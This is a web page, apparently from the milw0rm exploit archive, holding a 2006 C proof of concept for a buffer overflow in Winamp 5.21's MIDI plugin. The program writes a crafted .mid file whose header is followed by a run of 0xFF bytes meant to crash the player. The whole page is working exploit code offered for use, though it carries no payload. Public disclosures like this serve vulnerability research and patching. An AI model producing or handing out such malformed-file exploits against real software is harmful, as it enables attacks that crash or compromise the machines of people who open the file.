<html><head><title>Winamp <= 5.21 (Midi File Header Handling) Buffer Overflow PoC</title></head><pre>/*
 
 * ********************************************** *
 * Winamp 5.21 - Midi Buffer Overflow in_midi.dll *
 * ********************************************** *
 * PoC coded by: BassReFLeX                       *
 * Date: 19 Jun 2006                              *
 * ********************************************** *
 
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void usage(char* file);

char header[] = &quot;\x4D\x54\x68\x64\x00\x00&quot;
                &quot;\x00\x06\x00\x00\x00\x01&quot;
                &quot;\x00\x60\x4D\x54\x72\x6B&quot;
                &quot;\x00\x00&quot;;

char badc0de[] = &quot;\xFF\xFF\xFF\xFF\xFF\xFF&quot;
		 &quot;\xFF\xFF\xFF\xFF\xFF\xFF&quot;;
				
				 
				 
int main(int argc,char* argv[])
{
    system(&quot;cls&quot;);
    printf(&quot;\n* ********************************************** *&quot;);
    printf(&quot;\n* Winamp 5.21 - Midi Buffer Overflow in_midi.dll *&quot;);
    printf(&quot;\n* ********************************************** *&quot;);
    printf(&quot;\n* PoC coded by: BassReFLeX                       *&quot;);
    printf(&quot;\n* Date: 19 Jun 2006                              *&quot;);
    printf(&quot;\n* ********************************************** *&quot;);
    
    if ( argc!=2 )
    {
        usage(argv[0]);
    }
    
    FILE *f;
    f = fopen(argv[1],&quot;w&quot;);
    if ( !f )
    {
        printf(&quot;\nFile couldn't open!&quot;);
        exit(1);
    }
    
                        
    printf(&quot;\n\nWriting crafted .mid file...&quot;);
    fwrite(header,1,sizeof(header),f);
    fwrite(badc0de,1,sizeof(badc0de),f);
    printf(&quot;\nFile created successfully!&quot;);
    printf(&quot;\nFile: %s&quot;,argv[1]);
    return 0;
}        

void usage(char* file)
{
    printf(&quot;\n\n&quot;);
    printf(&quot;\n%s &lt;Filename&gt;&quot;,file);
    printf(&quot;\n\nFilename = .mid crafted file. Example: winsploit.exe craftedsh1t.mid&quot;);
    exit(1);
}    

// milw0rm.com [2006-06-20]</pre></html>